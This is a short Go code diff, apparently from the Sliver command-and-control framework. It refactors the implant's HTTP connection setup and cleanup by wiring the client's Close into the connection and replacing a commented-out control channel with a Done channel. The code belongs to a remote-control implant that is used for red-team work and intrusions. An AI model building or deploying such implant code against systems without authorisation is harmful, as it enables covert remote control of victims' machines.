@@ -32,7 +32,7 @@ import (
 )
 
 // SetupConnectionHTTP - Wraps an HTTP client session into a logical Connection stream
-func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile) (*transports.Connection, error) {
+func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile, userCleanup func() error) (*transports.Connection, error) {
 
 	// {{if .Config.Debug}}
 	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
@@ -48,37 +48,13 @@ func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile) (*transports.Co
 	}
 	c2.ProxyURL = client.ProxyURL
 
+	// Create a new Session-level connection and register cleaning the HTTP client
+	// This will thus make both Session & Beacon C2 modes to work the same way.
 	connection := transports.NewConnection()
-	// var cleanup = func() {
-	//         // {{if .Config.Debug}}
-	//         log.Printf("[http] lost connection, cleanup...")
-	//         // {{end}}
-	//         // close(send)
-	//         // ctrl <- true
-	// }
-
-	// send := make(chan *pb.Envelope)
-	// recv := make(chan *pb.Envelope)
-	// connection := &transports.Connection{
-	//         Send:    send,
-	//         Recv:    recv,
-	//         ctrl:    ctrl,
-	//         tunnels: &map[uint64]*Tunnel{},
-	//         mutex:   &sync.RWMutex{},
-	//         once:    &sync.Once{},
-	//         IsOpen:  true,
-	//         cleanup: func() {
-	//                 // {{if .Config.Debug}}
-	//                 log.Printf("[http] lost connection, cleanup...")
-	//                 // {{end}}
-	//                 close(send)
-	//                 ctrl <- true
-	//                 close(recv)
-	//         },
-	// }
+	connection.Cleanup = client.Close
 
 	go func() {
-		defer connection.Cleanup()
+		defer connection.Close()
 		for envelope := range connection.Send {
 			// {{if .Config.Debug}}
 			log.Printf("[http] send envelope ...")
@@ -88,12 +64,12 @@ func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile) (*transports.Co
 	}()
 
 	go func() {
-		defer connection.Cleanup()
+		defer connection.Close()
 		errCount := 0 // Number of sequential errors
 		for {
 			select {
-			// case <-ctrl:
-			//         return
+			case <-connection.Done:
+				return
 			default:
 				envelope, err := client.ReadEnvelope()
 				switch errType := err.(type) {
